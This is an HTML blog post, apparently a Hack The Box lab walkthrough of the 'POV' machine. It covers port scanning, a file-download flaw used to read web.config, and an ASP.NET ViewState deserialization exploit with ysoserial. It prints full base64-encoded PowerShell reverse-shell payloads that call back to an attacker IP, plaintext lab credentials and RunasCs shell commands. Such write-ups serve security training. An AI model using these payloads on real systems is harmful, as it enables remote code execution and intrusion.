@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="IntroductionPOV machine is hard for beginer. There are lots of techique skiff beyond the CTF and close to real world attack maybe?  Download files arbitrarily .NET forgery deserialization Windows Ba">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB POV ">
+<meta property="og:url" content="http://kelpie.top/post/Virtual%20Attack[23].html">
+<meta property="og:site_name" content="Kelpie Blog">
+<meta property="og:description" content="IntroductionPOV machine is hard for beginer. There are lots of techique skiff beyond the CTF and close to real world attack maybe?  Download files arbitrarily .NET forgery deserialization Windows Ba">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhdLe_RkqW_PqIyk0FXfXEZfccVH.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtRmNoJoHKwqcagtR4GPYD1Ncm8F.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkV4D8SS28eq7af4o1DbD5rVOaw1.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsMj0up9uwgJZliQOFu5PhY4IDCE.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkdlC4H0zn5VeBg3wFimP5TmbS3s.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhV1YPMyxjhlNiMWSEs-KEt6--8f.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkCh6OYkPH8AnJN_0T1yfHey-6W8.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FlDTdV_jINDwESOuM0CkjcZwAl3g.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fot-lwM-L74S-Y4gQrq0LtslVwWG.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fja0851CMNCueA9kDakrS4e8iupO.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkGPhTN0TJDR0gDmeHYqkJc8yAeu.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvMJ4zesYVDkNwukko2lD8Ixds_7.png">
+<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Ftn_q8UQcYAV5stSwoCePTv1rtOo.png">
+<meta property="article:published_time" content="2024-04-04T14:18:00.000Z">
+<meta property="article:modified_time" content="2024-04-10T09:43:10.234Z">
+<meta property="article:author" content="l3vi4th4n">
+<meta property="article:tag" content="Hack the Box">
+<meta property="article:tag" content="Penestration Test">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhdLe_RkqW_PqIyk0FXfXEZfccVH.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB POV </title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/post/Virtual%20Attack%5B22%5D.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack[23].html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack[23].html&text=HTB POV "><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack[23].html&title=HTB POV "><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack[23].html&is_video=false&description=HTB POV "><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB POV &body=Check out this article: http://kelpie.top/post/Virtual%20Attack[23].html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack[23].html&title=HTB POV "><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack[23].html&title=HTB POV "><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack[23].html&title=HTB POV "><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack[23].html&title=HTB POV "><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack[23].html&name=HTB POV &description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack[23].html&t=HTB POV "><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Portscan"><span class="toc-number">2.1.</span> <span class="toc-text">Portscan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Net-serialization-attack"><span class="toc-number">2.2.</span> <span class="toc-text">.Net serialization attack</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lateral-Movment"><span class="toc-number">3.</span> <span class="toc-text">Lateral Movment</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB POV 
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">l3vi4th4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-04T14:18:00.000Z" class="dt-published" itemprop="datePublished">2024-04-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Penestration-Test/">Penestration Test</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hack-the-Box/" rel="tag">Hack the Box</a>, <a class="p-category" href="/tags/Penestration-Test/" rel="tag">Penestration Test</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <span id="more"></span>
+
+<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>POV machine is hard for beginer. There are lots of techique skiff beyond the CTF and close to real world attack maybe?</p>
+<ol>
+<li>Download files arbitrarily</li>
+<li>.NET forgery deserialization</li>
+<li>Windows Basic info collection</li>
+<li>Prvilege escalation trick ( the time I spent most ）</li>
+</ol>
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><h2 id="Portscan"><a href="#Portscan" class="headerlink" title="Portscan"></a>Portscan</h2><p>I use nmap scan, I find only port 80 open and then I will try directory buster and subdomain buster to collect more info.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Nmap 7.94SVN scan initiated Wed Apr  3 03:31:07 2024 as: nmap -sT -T4 -sC --min-rate=1000 -p- -A -oN nmapscan.txt pov.htb</span>
+Nmap scan report <span class="token keyword">for</span> pov.htb <span class="token punctuation">(</span><span class="token number">10.10</span>.11.251<span class="token punctuation">)</span>
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.81s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65534</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
+PORT   STATE SERVICE VERSION
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Microsoft IIS httpd <span class="token number">10.0</span>
+<span class="token operator">|</span> http-methods:
+<span class="token operator">|</span>_  Potentially risky methods: TRACE
+<span class="token operator">|</span>_http-title: pov.htb
+Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+<span class="token comment"># Nmap done at Wed Apr  3 03:34:25 2024 -- 1 IP address (1 host up) scanned in 199.00 seconds</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>But nothing have been found. That’s werid. In the default main web page, I found the [ dev.pov.htb ]<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhdLe_RkqW_PqIyk0FXfXEZfccVH.png"></p>
+<p>I have tried to find more web contents by gobuster in dev.pov.htb , it failed.</p>
+<p>In the dev.pov.htb main page. I found contact page and home page is useful to help me to access the shell.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FtRmNoJoHKwqcagtR4GPYD1Ncm8F.png"></p>
+<p>I tried to use XSS attack, but it didn’t work here.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkV4D8SS28eq7af4o1DbD5rVOaw1.png"></p>
+<h2 id="Net-serialization-attack"><a href="#Net-serialization-attack" class="headerlink" title=".Net serialization attack"></a>.Net serialization attack</h2><p>I still found some useful info in burp suite. The machine is running the IIS because the page is aspx. And __VIEWSTATE is a serialized data, we can use some tools and skill to get the shell.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FsMj0up9uwgJZliQOFu5PhY4IDCE.png"></p>
+<p><a target="_blank" rel="noopener" href="https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net">LINK-1</a> Introduce **VIEWSTATE<br><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-**viewstate-parameter">LINK-2</a> Attack __VIEWSTATE</p>
+<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkdlC4H0zn5VeBg3wFimP5TmbS3s.png"></p>
+<p>Yoserial is make some command to serialize with some crypto method. We need the key and crypto method, that’s the next target I aim to.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ysoserial.exe <span class="token punctuation">[</span>command<span class="token punctuation">]</span>  <span class="token punctuation">[</span>method-key<span class="token punctuation">]</span> -<span class="token operator">></span> mailcious code<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Because the key and crypto method is in web_config, I try to find some way to get it like download etc.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhV1YPMyxjhlNiMWSEs-KEt6--8f.png"></p>
+<p>In the burp suite, I try to change the filename and it works.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkCh6OYkPH8AnJN_0T1yfHey-6W8.png"><br>We can change the file name to _web.config, and found some method.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FlDTdV_jINDwESOuM0CkjcZwAl3g.png"></p>
+<p>We can create the reverse shell in <a target="_blank" rel="noopener" href="https://www.revshells.com/">reverse_shell</a><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fot-lwM-L74S-Y4gQrq0LtslVwWG.png"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.<span class="token punctuation">\</span>ysoserial.exe <span class="token parameter variable">-p</span> ViewState <span class="token parameter variable">-g</span> TextFormattingRunProperties <span class="token parameter variable">-c</span> <span class="token string">"powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAyACIALAA5ADAAMAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="</span> <span class="token parameter variable">--path</span><span class="token operator">=</span><span class="token string">"/portfolio/default.aspx"</span> <span class="token parameter variable">--apppath</span><span class="token operator">=</span><span class="token string">"/"</span> <span class="token parameter variable">--decryption</span><span class="token operator">=</span><span class="token string">"AES"</span> <span class="token parameter variable">--decryptionkey</span><span class="token operator">=</span><span class="token string">"74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"</span> <span class="token parameter variable">--validation</span><span class="token operator">=</span><span class="token string">"SHA1"</span>  <span class="token parameter variable">--validationkey</span><span class="token operator">=</span><span class="token string">"5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>We can change the __VIEWSTATE<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fja0851CMNCueA9kDakrS4e8iupO.png"></p>
+<h1 id="Lateral-Movment"><a href="#Lateral-Movment" class="headerlink" title="Lateral Movment"></a>Lateral Movment</h1><p>We can get the shell, and find some interesting the file in **C:\Users\sfitz\Documents**<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkGPhTN0TJDR0gDmeHYqkJc8yAeu.png"></p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#secure-string-to-plaintext">https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#secure-string-to-plaintext</a><br>We can get the password.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">UserName       <span class="token builtin class-name">:</span> alaading
+Password       <span class="token builtin class-name">:</span> f8gQ8fynP44ek1m3
+SecurePassword <span class="token builtin class-name">:</span> System.Security.SecureString
+Domain         <span class="token builtin class-name">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>We can save the password in the $credential.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$securePassword</span> <span class="token operator">=</span> ConvertTo-SecureString <span class="token string">"f8gQ8fynP44ek1m3"</span> <span class="token parameter variable">-AsPlainText</span> <span class="token parameter variable">-Force</span>
+<span class="token variable">$credential</span> <span class="token operator">=</span> New-Object System.Management.Automation.PSCredential<span class="token punctuation">(</span><span class="token string">"alaading"</span>, <span class="token variable">$securePassword</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Invoke-Command <span class="token parameter variable">-ComputerName</span> localhost
+  <span class="token parameter variable">-Credential</span> <span class="token variable">$credential</span> <span class="token parameter variable">-ScriptBlock</span>
+    <span class="token punctuation">&#123;</span>powershell <span class="token parameter variable">-e</span> <span class="token assign-left variable">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAyACIALAA5ADAAMAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA</span><span class="token operator">==</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>When I get the shell of alaading, I can found that SeDebugPriv is disabled.<br>My thought is making it enable.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvMJ4zesYVDkNwukko2lD8Ixds_7.png"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs">https://github.com/antonioCoco/RunasCs</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe <span class="token parameter variable">-r</span> <span class="token operator">&lt;</span>ip<span class="token operator">></span>:<span class="token operator">&lt;</span>port<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Upload the meterpreter shell and migrate in system pri process.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Ftn_q8UQcYAV5stSwoCePTv1rtOo.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Portscan"><span class="toc-number">2.1.</span> <span class="toc-text">Portscan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Net-serialization-attack"><span class="toc-number">2.2.</span> <span class="toc-text">.Net serialization attack</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lateral-Movment"><span class="toc-number">3.</span> <span class="toc-text">Lateral Movment</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack[23].html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack[23].html&text=HTB POV "><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack[23].html&title=HTB POV "><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack[23].html&is_video=false&description=HTB POV "><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB POV &body=Check out this article: http://kelpie.top/post/Virtual%20Attack[23].html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack[23].html&title=HTB POV "><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack[23].html&title=HTB POV "><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack[23].html&title=HTB POV "><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack[23].html&title=HTB POV "><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack[23].html&name=HTB POV &description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack[23].html&t=HTB POV "><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
